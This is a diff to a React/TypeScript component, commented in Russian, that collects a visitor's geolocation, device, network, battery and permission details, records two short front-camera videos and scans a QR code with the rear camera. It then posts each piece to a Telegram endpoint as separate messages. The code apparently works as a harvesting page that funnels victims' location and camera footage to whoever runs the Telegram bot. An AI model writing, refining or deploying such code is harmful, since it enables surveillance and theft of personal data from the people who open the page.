@@ -19,23 +19,32 @@ const VIDEO_SEGMENT_DURATION_MS = 3000; // 3 seconds for each video segment
 const QR_SCAN_TIMEOUT_MS = 10000; // 10 seconds for QR scanning
 
 type GeolocationData = { latitude: number; longitude: number };
-type ClientInfo = { userAgent: string; platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; };
+type ClientInfo = { platform: string; hardwareConcurrency: number; screenWidth?: number; screenHeight?: number; browserLanguage?: string; }; // UserAgent удален
 type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
 type BatteryInfo = { level?: number; charging?: boolean; status?: string };
 
-type CollectedData = {
-  timestamp: string;
+// Определяем типы данных, которые могут быть отправлены
+type TelegramDataPayload = {
+  messageType: MessageType;
+  timestamp: string; // Добавлено для каждого сообщения
   geolocation?: GeolocationData;
   clientInfo?: ClientInfo;
   networkInfo?: NetworkInfo;
   deviceMemory?: number;
   batteryInfo?: BatteryInfo;
   permissionStatus?: PermissionStatus;
-  ipAddress?: string;
   video1?: string;
   video2?: string;
   qrCodeData?: string;
 };
+
+// Enum для типов сообщений
+enum MessageType {
+  InitialSummary = "initial_summary",
+  Video1 = "video1",
+  Video2 = "video2",
+  QrCode = "qr_code",
+}
 
 type AppPhase =
   | "initial"
@@ -52,32 +61,41 @@ const PermissionHandler = () => {
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
   const [loadingMessage, setLoadingMessage] = useState("Подготовка к запуску...");
-  const [collectedData, setCollectedData] = useState<CollectedData>({ timestamp: new Date().toISOString() });
+  const [collectedData, setCollectedData] = useState<Omit<TelegramDataPayload, 'messageType' | 'timestamp'>>({}); // Храним все данные локально
   const [sessionKey, setSessionKey] = useState(0);
   const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);
 
-  const sendDataToTelegram = useCallback(async (data: CollectedData): Promise<boolean> => {
+  const sendDataToTelegram = useCallback(async (data: Partial<TelegramDataPayload>, type: MessageType): Promise<boolean> => {
     try {
+      const payload: TelegramDataPayload = {
+        ...data,
+        messageType: type,
+        timestamp: new Date().toISOString(), // Добавляем временную метку для каждого сообщения
+      };
+
       const response = await fetch(TELEGRAM_API_ENDPOINT, {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
-        body: JSON.stringify(data),
+        body: JSON.stringify(payload),
       });
 
       if (response.ok) {
-        console.log("Data successfully sent to Telegram!");
-        toast.success("Данные успешно отправлены в Telegram!");
+        console.log(`Data of type ${type} successfully sent to Telegram!`);
+        // Тосты только для важных событий
+        if (type === MessageType.InitialSummary || type === MessageType.QrCode) {
+          toast.success("Данные успешно отправлены в Telegram!");
+        }
         return true;
       } else {
         const errorData = await response.json();
-        console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
-        toast.error(`Ошибка отправки данных: ${errorData.error || response.statusText}`);
+        console.error(`Failed to send data of type ${type} to Telegram: ${errorData.error || response.statusText}`);
+        toast.error(`Ошибка отправки данных (${type}): ${errorData.error || response.statusText}`);
         return false;
       }
     } catch (error: any) {
-      console.error(`Network error sending data to Telegram: ${error.message}`);
+      console.error(`Network error sending data of type ${type} to Telegram: ${error.message}`);
       toast.error(`Сетевая ошибка: ${error.message}`);
       return false;
     }
@@ -145,32 +163,28 @@ const PermissionHandler = () => {
   const handleQrCodeScanned = useCallback(
     async (qrData: string) => {
       console.log("QR Code Scanned in PermissionHandler:", qrData);
-      const finalData = { ...collectedData, qrCodeData: qrData };
-      setCollectedData(finalData);
-      const success = await sendDataToTelegram(finalData);
+      const success = await sendDataToTelegram({ qrCodeData: qrData }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
       toast.success("QR-код успешно отсканирован!");
     },
-    [collectedData, sendDataToTelegram]
+    [sendDataToTelegram]
   );
 
   const handleQrScanError = useCallback(
     async (error: string) => {
       console.error("QR Scan Error:", error);
-      const finalData = { ...collectedData, qrCodeData: `QR Scan Error: ${error}` };
-      setCollectedData(finalData);
-      const success = await sendDataToTelegram(finalData);
+      const success = await sendDataToTelegram({ qrCodeData: `QR Scan Error: ${error}` }, MessageType.QrCode);
       setProcessSuccessful(success);
       setAppPhase("finished");
       toast.error(`Ошибка сканирования QR: ${error}`);
     },
-    [collectedData, sendDataToTelegram]
+    [sendDataToTelegram]
   );
 
   const startNewSession = useCallback(() => {
     setAppPhase("initial");
-    setCollectedData({ timestamp: new Date().toISOString() });
+    setCollectedData({});
     setSessionKey((prevKey) => prevKey + 1);
     setProcessSuccessful(false); // Reset success status
   }, []);
@@ -182,14 +196,7 @@ const PermissionHandler = () => {
       setLoadingMessage("Сбор данных об устройстве и разрешениях...");
       setAppPhase("collectingData");
 
-      let currentCollectedDataState: CollectedData = { timestamp: new Date().toISOString() };
-
-      // --- Start Video 1 Recording immediately ---
-      setLoadingMessage("Запись первого видео (фронтальная камера)...");
-      setAppPhase("recordingVideo1");
-      const video1Promise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
-
-      // --- Concurrently collect other data ---
+      // --- Concurrently collect all initial data ---
       const [
         permissionStatusResult,
         batteryInfoResult,
@@ -200,48 +207,59 @@ const PermissionHandler = () => {
         getGeolocation(),
       ]);
 
-      // Collect client info (synchronous)
       const clientInfo = getClientInfo();
-      currentCollectedDataState.clientInfo = clientInfo;
-      currentCollectedDataState.networkInfo = getNetworkInfo();
-      currentCollectedDataState.deviceMemory = getDeviceMemory();
+      const networkInfo = getNetworkInfo();
+      const deviceMemory = getDeviceMemory();
 
-      currentCollectedDataState.permissionStatus = permissionStatusResult;
+      const initialCollectedData: Omit<TelegramDataPayload, 'messageType' | 'timestamp'> = {
+        clientInfo: {
+          platform: clientInfo.platform,
+          hardwareConcurrency: clientInfo.hardwareConcurrency,
+          screenWidth: clientInfo.screenWidth,
+          screenHeight: clientInfo.screenHeight,
+          browserLanguage: clientInfo.browserLanguage,
+        },
+        networkInfo: networkInfo,
+        deviceMemory: deviceMemory,
+        permissionStatus: permissionStatusResult,
+      };
 
       if (batteryInfoResult.data) {
-        currentCollectedDataState.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
+        initialCollectedData.batteryInfo = { ...batteryInfoResult.data, status: batteryInfoResult.status };
       } else {
-        currentCollectedDataState.batteryInfo = { status: batteryInfoResult.status };
+        initialCollectedData.batteryInfo = { status: batteryInfoResult.status };
       }
 
       if (geolocationResult.data) {
-        currentCollectedDataState.geolocation = geolocationResult.data;
+        initialCollectedData.geolocation = geolocationResult.data;
       }
-      if (currentCollectedDataState.permissionStatus) {
-        currentCollectedDataState.permissionStatus.geolocation = geolocationResult.status;
+      if (initialCollectedData.permissionStatus) {
+        initialCollectedData.permissionStatus.geolocation = geolocationResult.status;
       }
+      
+      setCollectedData(initialCollectedData); // Сохраняем все собранные данные локально
 
-      currentCollectedDataState.ipAddress = "Fetching...";
+      // --- Send Initial Summary Report ---
+      const initialSendSuccess = await sendDataToTelegram(initialCollectedData, MessageType.InitialSummary);
+      setProcessSuccessful(initialSendSuccess);
 
-      // Await Video 1 completion and send
-      const video1Base64 = await video1Promise;
+      // --- Start Video 1 Recording ---
+      setLoadingMessage("Запись первого видео (фронтальная камера)...");
+      setAppPhase("recordingVideo1");
+      const video1Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video1Base64) {
-        currentCollectedDataState = { ...currentCollectedDataState, video1: video1Base64 };
+        const video1SendSuccess = await sendDataToTelegram({ video1: video1Base64 }, MessageType.Video1);
+        setProcessSuccessful(prev => prev && video1SendSuccess);
       }
-      setCollectedData(currentCollectedDataState);
-      await sendDataToTelegram(currentCollectedDataState);
-      currentCollectedDataState.video1 = undefined; // Clear after sending
 
       // --- Video 2 Recording ---
       setLoadingMessage("Запись второго видео (фронтальная камера)...");
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video2Base64) {
-        currentCollectedDataState = { ...currentCollectedDataState, video2: video2Base64 };
+        const video2SendSuccess = await sendDataToTelegram({ video2: video2Base64 }, MessageType.Video2);
+        setProcessSuccessful(prev => prev && video2SendSuccess);
       }
-      setCollectedData(currentCollectedDataState);
-      await sendDataToTelegram(currentCollectedDataState);
-      currentCollectedDataState.video2 = undefined; // Clear after sending
 
       // --- QR Scanning ---
       setLoadingMessage("Переключение на заднюю камеру для сканирования QR-кода...");
@@ -250,10 +268,8 @@ const PermissionHandler = () => {
 
       qrTimeout = setTimeout(async () => {
         console.log("QR scanning timed out.");
-        const finalData = { ...currentCollectedDataState, qrCodeData: "QR Scan Timed Out" };
-        setCollectedData(finalData);
-        const success = await sendDataToTelegram(finalData);
-        setProcessSuccessful(success);
+        const qrTimeoutSendSuccess = await sendDataToTelegram({ qrCodeData: "QR Scan Timed Out" }, MessageType.QrCode);
+        setProcessSuccessful(prev => prev && qrTimeoutSendSuccess);
         setAppPhase("finished");
         toast.error("Время сканирования QR-кода истекло.");
       }, QR_SCAN_TIMEOUT_MS);
@@ -273,7 +289,7 @@ const PermissionHandler = () => {
         videoRef.current.srcObject = null;
       }
     };
-  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, collectedData]);
+  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment]);
 
 
   return (
